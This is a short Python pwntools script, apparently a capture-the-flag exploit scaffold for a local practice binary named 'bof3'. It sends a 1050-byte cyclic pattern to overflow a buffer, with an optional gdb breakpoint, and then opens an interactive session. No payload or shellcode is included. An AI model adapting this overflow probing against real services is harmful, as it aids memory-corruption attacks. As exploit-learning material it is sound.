#!/usr/bin/python
import sys
import time
import argparse
from pwn import *
context.update(arch='i386', os='linux')

def wait_for_prompt(r):
  print r.recvuntil("MUHAHAHAH: ")

def wait_newline_and_dump(r):
  data = r.recvuntil('\n')
  if data:
    print data.encode('hex')
    print data
  return data

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  args = parser.parse_args()
  exe = './bof3'

  if args.dbg:
    r = gdb.debug([exe], gdbscript="""
    b *func
    continue
    """)
  else:
    r = process(exe)

  wait_for_prompt(r)
  payload  = cyclic(1050)
  r.sendline(payload) 

  # Drop to interactive console
  r.interactive()

